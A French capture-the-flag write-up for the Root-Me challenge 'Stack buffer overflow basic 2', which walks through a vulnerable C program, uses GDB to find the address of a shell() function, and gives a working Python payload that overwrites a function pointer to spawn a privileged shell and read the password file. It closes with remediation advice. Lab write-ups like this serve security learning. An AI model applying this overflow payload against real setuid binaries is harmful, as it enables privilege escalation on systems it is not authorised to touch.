# L’épopée Root-Me : App-Système | ELF x86 - Stack buffer overflow basic 2

## 1. Informations Générales & Configuration de l'Environnement

| Protection | Nom complet | État |
| :--- | :--- | :---: |
| **PIE** | Position Independent Executable | [❌] |
| **RelRO** | Read Only relocations | [❌] |
| **NX** | Pile non exécutable | [✔️] |
| **Heap exec** | Tas non exécutable | [✔️] |
| **ASLR** | Distribution aléatoire de l'espace d'adressage | [❌] |
| **SF** | Source Fortification | [❌] |
| **SSP** | Stack-Smashing Protection | [❌] |
| **SRC** | Accès au code source | [✔️] |

---

## 2. Analyse du Code Source

```[langage]
    #include <stdio.h>
    #include <stdlib.h>
    #include <sys/types.h>
    #include <unistd.h>
     
    void shell() {
        setreuid(geteuid(), geteuid());
        system("/bin/bash");
    }
     
    void sup() {
        printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
    }
     
    void main()
    {
        int var;
        void (*func)()=sup;
        char buf[128];
        fgets(buf,133,stdin);
        func();
    }
```

### Le challenge :

La première étape de ce challenge va être la lecture du code. Voici les informations notables :

- La fonction shell semble ouvrir un shell avec les privilèges root.
- Un pointeur func vers une fonction sup() qui écrit quelque chose.
- fgets qui récupère une entrée de maximum 132 caractères et les stocke dans un buffer de taille 128.

Une première faille semble me sauter aux yeux : la possibilité d'écrire + que ce que le buffer peut contenir.

---

## 3. Exploitation & Démarche de Résolution

### Étape 1 : Déroulement basique du script

Tout d'abord, on va vérifier le déroulement basique du programme :

```bash
app-systeme-ch15@challenge02:~$ ./ch15 
hello
Hey dude ! Waaaaazzaaaaaaaa ?!
```
Essayons une saisie plus longue.

```bash
app-systeme-ch15@challenge02:~$ ./ch15 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA     
app-systeme-ch15@challenge02:~$ ./ch15 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Erreur de segmentation
app-systeme-ch15@challenge02:~$ ./ch15 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
Hey dude ! Waaaaazzaaaaaaaa ?!
app-systeme-ch15@challenge02:~$ 
```

On voit plusieurs cas de figures :
- Comportement normal
- Segfault
- Rien en apparence.


### Étape 2 : Identification de la vulnérabilité

En débordant sur la mémoire, on peut remplacer l'adresse pointé par func, en récupérant l'adresse de shell() il serait possible de l'ouvrir en la faisant passer.

### Étape 3 : Analyse du comportement

Lorsqu'un programme est en mémoire, il le lit dans l'ordre, lors de l'appel d'une fonction, on saute à une adresse mémoire définie avant de revenir à l'adresse où l'on s'est arrêté. func() lui, stocke donc l'adresse de sup(), en récupérant grâce à GDB l'adresse de shell. On peut remplacer en écrivant directement dans la mémoire (principe du buffer overflow) l'adresse pointée par une autre, ici celle de shell.

### Étape 4 : Exploitation

Maintenant que nous avons trouvé une solution, nous allons essayer de trouver l'adresse de shell() :

```bash
(gdb) print shell
$1 = {<text variable, no debug info>} 0x8048516 <shell>
```

Ensuite plus qu'à injecter l'adresse grâce à une commande en python :

```bash
app-systeme-ch15@challenge02:~$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*128 + b"\x16\x85\x04\x08\n")'; cat) | ./ch15
ls -la
total 36
dr-xr-x---  2 app-systeme-ch15-cracked app-systeme-ch15 4096 déc.  10  2021 .
drwxr-xr-x 18 root                     root             4096 déc.  10  2021 ..
-r-sr-x---  1 app-systeme-ch15-cracked app-systeme-ch15 7404 déc.  10  2021 ch15
-rw-r-----  1 app-systeme-ch15-cracked app-systeme-ch15  337 déc.  10  2021 ch15.c
-rw-r-----  1 root                     root               44 déc.  10  2021 .git
-r--r-----  1 app-systeme-ch15-cracked app-systeme-ch15  537 déc.  10  2021 Makefile
-r--------  1 app-systeme-ch15-cracked app-systeme-ch15   23 déc.  10  2021 .passwd
-r--------  1 root                     root              791 déc.  10  2021 ._perms
cat .passwd
********************
```

Le mot de passe est en poche.

---

## 4. Comment se protéger ?

Ici, l'erreur venait encore une fois d'un manque de contrôle de l'entrée utilisateur et d'une mauvaise gestion de la mémoire.

Pour corriger ce problème, la solution est 

1. Utiliser sizeof() pour respecter la taille du buffer avec fgets()
2. Et activer les défenses du compilateur pour éviter qu'on puisse récupérer les adresses des fonctions.
